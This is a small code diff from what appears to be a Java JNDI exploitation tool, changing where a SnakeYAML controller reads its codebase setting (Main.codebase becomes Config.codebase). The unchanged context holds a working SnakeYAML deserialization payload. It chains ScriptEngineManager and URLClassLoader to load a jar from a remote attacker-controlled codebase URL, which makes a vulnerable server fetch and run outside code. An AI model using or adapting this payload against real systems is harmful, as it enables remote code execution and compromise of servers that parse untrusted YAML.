@@ -1,5 +1,6 @@
 package map.jndi.controller;
 
+import map.jndi.Config;
 import map.jndi.Main;
 import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
@@ -34,7 +35,7 @@ public class SnakeYamlController extends BasicController {
 
         String yaml = "!!javax.script.ScriptEngineManager [\n" +
                 "  !!java.net.URLClassLoader [[\n" +
-                "    !!java.net.URL [\"" + Main.codebase + jarName + ".jar" + "\"]\n" +
+                "    !!java.net.URL [\"" + Config.codebase + jarName + ".jar" + "\"]\n" +
                 "  ]]\n" +
                 "]";
 
